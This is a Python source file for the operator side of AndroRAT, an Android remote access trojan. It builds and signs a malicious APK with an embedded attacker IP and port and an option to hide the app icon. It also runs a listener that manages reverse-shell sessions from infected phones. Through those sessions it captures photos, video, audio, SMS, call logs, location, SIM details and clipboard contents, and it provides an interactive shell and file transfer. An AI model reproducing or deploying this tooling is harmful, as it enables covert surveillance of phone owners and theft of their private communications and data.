import sys
import os
import base64
import time
import binascii
import select
import pathlib
import platform
import re
from subprocess import PIPE, run
import socket
import threading
import uuid
import queue

sys.stdout.reconfigure(encoding='utf-8')

clients = {}  
clients_lock = threading.Lock()
suppress_new_sessions = threading.Event()

banner = """\033[1m\033[91m
                     _           _____         _______
     /\             | |         |  __ \     /\|__   __|
    /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
   / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
  / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
 /_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|   
                                        - By karma9874
"""

pattern = '\"(\\d+\\.\\d+).*\"'

def stdOutput(type_=None):
    if type_=="error":col="31m";str="ERROR"
    if type_=="warning":col="33m";str="WARNING"
    if type_=="success":col="32m";str="SUCCESS"
    if type_ == "info":return "\033[1m[\033[33m\033[0m\033[1m\033[33mINFO\033[0m\033[1m] "
    message = "\033[1m[\033[31m\033[0m\033[1m\033["+col+str+"\033[0m\033[1m]\033[0m "
    return message


def animate(message):
    chars = "/—\\|"
    for char in chars:
        sys.stdout.write("\r"+stdOutput("info")+"\033[1m"+message+"\033[31m"+char+"\033[0m")
        time.sleep(.1)
        sys.stdout.flush()

def clearDirec():
    if(platform.system() == 'Windows'):
        clear = lambda: os.system('cls')
        direc = "\\"
    else:
        clear = lambda: os.system('clear')
        direc = "/"
    return clear,direc

clear,direc = clearDirec()
if not os.path.isdir(os.getcwd()+direc+"Dumps"):
    os.makedirs("Dumps")

def is_valid_ip(ip):
    m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
    return bool(m) and all(map(lambda n: 0 <= int(n) <= 255, m.groups()))

def is_valid_port(port):
    i = 1 if port.isdigit() and len(port)>1  else  0
    return i

def execute(command):
    return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

def executeCMD(command,queue):
    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    queue.put(result)
    return result


def getpwd(name):
    return os.getcwd()+direc+name;

def help():
    helper="""
    Usage:
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a interactive shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
    """
    print(helper)

def getImage(client):
    print(stdOutput("info")+"\033[0mTaking Image")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    flag=0
    filename ="Dumps"+direc+"Image_"+timestr+'.jpg'
    imageBuffer=recvall(client) 
    imageBuffer = imageBuffer.strip().replace("END123","").strip()
    if imageBuffer=="":
        print(stdOutput("error")+"Unable to connect to the Camera\n")
        return
    with open(filename,'wb') as img:    
        try:
            imgdata = base64.b64decode(imageBuffer)
            img.write(imgdata)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
        except binascii.Error as e:
            flag=1
            print(stdOutput("error")+"Not able to decode the Image\n")
    if flag == 1:
        os.remove(filename)

def readSMS(client,data):
    print(stdOutput("info")+"\033[0mGetting "+data+" SMS")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = "Dumps"+direc+data+"_"+timestr+'.txt'
    flag =0
    with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
        msg = recvall(client)
        try:
            txt.write(msg)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
        except UnicodeDecodeError:
            flag = 1
            print(stdOutput("error")+"Unable to decode the SMS\n")
    if flag == 1:
        os.remove(filename)

def getFile(filename,ext,data):
    fileData = "Dumps"+direc+filename+"."+ext
    flag=0
    with open(fileData, 'wb') as file:
        try:
            rawFile = base64.b64decode(data)
            file.write(rawFile)
            print(stdOutput("success")+"Succesfully Downloaded in \033[1m\033[32m"+getpwd(fileData)+"\n")
        except binascii.Error:
            flag=1
            print(stdOutput("error")+"Not able to decode the Audio File")
    if flag == 1:
        os.remove(filename)

def putFile(filename):
    data = open(filename, "rb").read()
    encoded = base64.b64encode(data)
    return encoded

def shell(client):
    msg = "start"
    command = "ad"
    while True:
        msg = recvallShell(client)
        if "getFile" in msg:
            msg=" "
            msg1 = recvall(client)
            msg1 = msg1.replace("\nEND123\n","")
            filedata = msg1.split("|_|")
            getFile(filedata[0],filedata[1],filedata[2])
            
        if "putFile" in msg:
            msg=" "
            sendingData=""
            filename = command.split(" ")[1].strip()
            file = pathlib.Path(filename)
            if file.exists():
                encoded_data = putFile(filename).decode("UTF-8")
                filedata = filename.split(".")
                sendingData+="putFile"+"<"+filedata[0]+"<"+filedata[1]+"<"+encoded_data+"END123\n"
                client.send(sendingData.encode("UTF-8"))
                print(stdOutput("success")+f"Succesfully Uploaded the file \033[32m{filedata[0]+'.'+filedata[1]} in /sdcard/temp/")
            else:
                print(stdOutput("error")+"File not exist")

        if "Exiting" in msg:
            print("\033[1m\033[33m----------Exiting Shell----------\n")
            return
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)    
        print(" ")
        command = input("\033[1m\033[36mandroid@shell:~$\033[0m \033[1m")
        command = command+"\n"
        if command.strip() == "clear":
            client.send("test\n".encode("UTF-8"))
            clear()
        else:
            client.send(command.encode("UTF-8"))        

def getLocation(sock):
    msg = "start"
    while True:
        msg = recvall(sock)
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)    
        if("END123" in msg):
            return
        print(" ")      

def recvall(sock):
    buff=""
    data = ""
    while "END123" not in data:
        data = sock.recv(4096).decode("UTF-8","ignore")
        buff+=data
    return buff


def recvallShell(sock, timeout=3):
    # non‑blocking read for interactive shell or it gets stuck
    buff = ""
    end_time = time.time() + timeout
    while time.time() < end_time:
        ready, _, _ = select.select([sock], [], [], 0.3)
        if ready:
            data = sock.recv(4096)
            if not data:
                return ""
            buff += data.decode("utf-8", "ignore")
            if "END123" in buff:
                return buff.replace("END123", "").strip("\n")
        else:
            continue
    return "bogus"  # nothing received within timeout

def recv_until(sock, marker="END123", timeout=2.0):
    """
    Non-blocking read for up to `timeout` seconds, returning everything
    up to (but not including) `marker`. Returns None if socket closes.
    """
    buff = ""
    end_time = time.time() + timeout
    sock.setblocking(False)
    try:
        while time.time() < end_time:
            ready, _, _ = select.select([sock], [], [], 0.1)
            if not ready:
                continue
            chunk = sock.recv(4096)
            if not chunk:
                return None
            buff += chunk.decode("utf-8", "ignore")
            if marker in buff:
                break
    finally:
        sock.setblocking(True)

    if marker in buff:
        return buff.split(marker, 1)[0].rstrip("\n")
    return buff.rstrip("\n")

def stopAudio(client):
    print(stdOutput("info")+"\033[0mDownloading Audio")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data= ""
    flag =0
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "Dumps"+direc+"Audio_"+timestr+".mp3"
    with open(filename, 'wb') as audio:
        try:
            audioData = base64.b64decode(data)
            audio.write(audioData)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
        except binascii.Error:
            flag=1
            print(stdOutput("error")+"Not able to decode the Audio File")
    print(" ")
    if flag == 1:
        os.remove(filename)


def stopVideo(client):
    print(stdOutput("info")+"\033[0mDownloading Video")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data= ""
    flag=0
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "Dumps"+direc+"Video_"+timestr+'.mp4' 
    with open(filename, 'wb') as video:
        try:
            videoData = base64.b64decode(data)
            video.write(videoData)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
        except binascii.Error:
            flag = 1
            print(stdOutput("error")+"Not able to decode the Video File\n")
    if flag == 1:
        os.remove("Video_"+timestr+'.mp4')

def callLogs(client):
    print(stdOutput("info")+"\033[0mGetting Call Logs")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    msg = recvall(client)
    filename = "Dumps"+direc+"Call_Logs_"+timestr+'.txt'
    if "No call logs" in msg:
        msg.split("\n")
        print(msg.replace("END123","").strip())
        print(" ")
    else:
        with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
            txt.write(msg)
            txt.close()
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
            if not os.path.getsize(filename):
                os.remove(filename)

def session_handler(conn, addr, client_id):
    clear()
    print(f"\033[1m\033[33mGot connection from \033[31m{addr}\033[0m")
    device = clients[client_id].get('device', 'Unknown')
    print(f"[*] Session {client_id}  Device: {device}\n")

    prompt_top   = f"\033[1m\033[36mInterpreter({client_id}):/> \033[0m"
    prompt_shell = f"\033[1m\033[36mRemoteShell({client_id}):$ \033[0m"
    prompt = prompt_top
    in_shell = False
    detach = False

    while True:
        try:
            cmd = input(prompt).strip()
        except (KeyboardInterrupt, EOFError):
            if in_shell:
                conn.send(b"exit\n")
                in_shell = False
                prompt = prompt_top
                print(stdOutput('info') + "Exited remote shell.")
                continue
            else:
                print(stdOutput('info') + f"Detached from {client_id}\n")
                detach = True
                break

        # handle local commands 
        if not in_shell and cmd in {'help','clear','exit'}:
            if cmd == 'help':
                help(); continue
            if cmd == 'clear':
                clear(); continue
            if cmd == 'exit':
                print(stdOutput('info') + f"Detached from {client_id}\n")
                detach = True
                break

        try:
            conn.send((cmd + '\n').encode('utf-8'))
        except (BrokenPipeError, ConnectionResetError):
            print(stdOutput('error') + "Connection lost.")
            break

        reply = recv_until(conn, timeout=2.0)
        if reply is None:
            print(stdOutput('error') + "Connection closed by target.")
            break

        # call helper on certain receives
        text = reply.strip()
        if text == 'IMAGE':
            getImage(conn)
            continue
        if text.startswith('readSMS'):
            parts = text.split()
            if len(parts) > 1:
                readSMS(conn, parts[1])
            continue
        if text == 'SHELL':
            in_shell = True
            prompt = prompt_shell
            continue
        if text == 'getLocation':
            getLocation(conn)
            continue
        if text == 'stopVideo123':
            stopVideo(conn)
            continue
        if text == 'stopAudio':
            stopAudio(conn)
            continue
        if text == 'callLogs':
            callLogs(conn)
            continue
        if text == 'help':
            help()
            continue

        if "Exiting Shell" in reply:
            in_shell = False
            prompt = prompt_top
            continue

        if reply:
            print(reply)

    if not detach:
        conn.close()
        with clients_lock:
            clients.pop(client_id, None)
        print(f"[-] Session {client_id} closed.\n")


def get_shell(ip, port):
    soc = socket.socket()
    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        soc.bind((ip, int(port)))
        soc.listen(5)
    except Exception as e:
        print(stdOutput("error") + f"Bind failed: {e}")
        sys.exit(1)

    print(banner)
    print(stdOutput("info") + f"Listening on {ip}:{port}\n")

    def accept_loop():
        while True:
            try:
                conn, addr = soc.accept()
            except Exception:
                continue

            try:
                conn.settimeout(0.5)
                raw = conn.recv(1024).decode("utf-8", "ignore").strip()
            except Exception:
                raw = ""
            finally:
                conn.settimeout(None)

            # drop HTTP requests. should filter by request name, but this works
            if raw.startswith("GET ") or "HTTP" in raw:
                conn.close()
                continue

            # manage duplicate sessions, may need to add bypass functionality for NATed addresses
            with clients_lock:
                existing = next((cid for cid, info in clients.items()
                                if info["addr"][0] == addr[0]), None)
            if existing:
                old = clients[existing]["conn"]
                try:
                    old.close()
                except:
                    pass
                with clients_lock:
                    clients[existing]["conn"] = conn
                    clients[existing]["addr"] = addr
                
                # extract model from welcome message
                prefix = "Hello there, welcome to reverse shell of "
                model = raw[len(prefix):] if raw.startswith(prefix) else clients[existing]["device"]
                clean = re.sub(r'[^A-Za-z0-9_.-]', '_', model)
                name = clean if len(clean) <= 16 else clean[:16] + "..."
                with clients_lock:
                    clients[existing]["device"] = name
                continue

            cid = uuid.uuid4().hex[:8]
            with clients_lock:
                clients[cid] = {"conn": conn, "addr": addr, "device": "Unknown"}

            # extract model from welcome message
            prefix = "Hello there, welcome to reverse shell of "
            if raw.startswith(prefix):
                model = raw[len(prefix):]
            else:
                model = raw or "Unknown"
            clean = re.sub(r'[^A-Za-z0-9_.-]', '_', model)
            name = clean if len(clean) <= 16 else clean[:16] + "..."
            with clients_lock:
                clients[cid]["device"] = name

            # don't print "New session" when in interpreter 
            if not suppress_new_sessions.is_set():
                print(f"\n[+] New session {cid} from {addr}  Device: {name}")
                sys.stdout.flush()


    threading.Thread(target=accept_loop, daemon=True).start()

    while True:
        cmd = input("\033[1;32mAndroRAT>\033[0m ").strip()
        if cmd == "list":
            with clients_lock:
                if not clients:
                    print("No active sessions.\n")
                else:
                    print()
                    for i, (cid, info) in enumerate(clients.items(), 1):
                        print(f"  {i}. {cid} | {info['device']:<20} | {info['addr']}")
            print()
        elif cmd.startswith("attach"):
            parts = cmd.split(maxsplit=1)
            if len(parts) != 2 or not parts[1].strip().isdigit():
                print(stdOutput("error") + "Usage: attach <session-number>\n")
                continue
            sel = int(parts[1].strip())
            with clients_lock:
                if sel < 1 or sel > len(clients):
                    print(stdOutput("error") +
                        "Invalid session number. Use 'list' to see active sessions.\n")
                    continue
                cid  = list(clients.keys())[sel - 1]
                info = clients[cid]
                
                suppress_new_sessions.set()
            try:
                session_handler(info["conn"], info["addr"], cid)
            except Exception as e:
                print(stdOutput("error") + f"Session error: {e}\n")
            finally:
                suppress_new_sessions.clear()
        elif cmd in ("help", "?"):
            print("""
    Commands:
      list             – show all active sessions
      attach <number>  – interact with a session by its number
      help, ?          – show this help menu
      exit             – quit the server
    """)
        elif cmd == "exit":
            print("Shutting down server.")
            soc.close()
            os._exit(0)
        elif not cmd:
            pass
        else:
            print("Unknown command. Type 'help' for available commands.\n")


# this function is no longer needed with the new threaded model
# def connection_checker(socket,queue):
#     conn, addr = socket.accept()
#     queue.put([conn,addr])
#     return conn,addr


def build(ip,port,output,ngrok=False,ng=None,icon=None):
    editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
    try:
        with open(editor, "r") as f:
            file = f.readlines()
        
        file[18] = file[18][:21] + "\"" + ip + "\"" + "\n"
        file[23] = file[23][:21] + "\"" + port + "\"" + "\n"
        file[28] = file[28][:15] + " 0x0" + "\n" if icon else file[28][:15] + " 0x1" + "\n"
        
        str_file="".join(file)
        with open(editor,"w") as f:
            f.write(str_file)

    except Exception as e:
        print(stdOutput("error") + f"Failed to modify smali file: {e}")
        sys.exit()

    java_version = execute("java -version")
    if java_version.returncode: 
        print(stdOutput("error")+"Java not installed or found on PATH");
        exit()

    print(stdOutput("info")+"\033[0mGenerating APK")
    outFileName = output if output else "karma.apk"
    que = queue.Queue()
    
    # Build APK
    t = threading.Thread(target=executeCMD,args=[f"java -jar Jar_utils/apktool.jar b Compiled_apk -o {outFileName}", que])
    t.start()
    while t.is_alive(): 
        animate("Building APK ")
    t.join()
    print(" ")

    resOut = que.get()
    if not resOut.returncode:
        print(stdOutput("success")+"Successfully built APK in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
        print(stdOutput("info")+"\033[0mSigning the APK")
        
        # Sign APK
        t = threading.Thread(target=executeCMD,args=[f"java -jar Jar_utils/sign.jar -a {outFileName} --overwrite", que])
        t.start()
        while t.is_alive(): 
            animate("Signing APK ")
        t.join()
        print(" ")

        resOut = que.get()
        if not resOut.returncode:
            print(stdOutput("success")+"Successfully signed the APK \033[1m\033[32m"+outFileName+"\033[0m")
            if ngrok:
                clear()
                listen_port = ng if ng else 8000
                get_shell("0.0.0.0", listen_port)
            print(" ")
        else:
            print("\r"+resOut.stderr)
            print(stdOutput("error")+"Signing Failed")
    else:
        print("\r"+resOut.stderr)
        print(stdOutput("error")+"Building Failed")
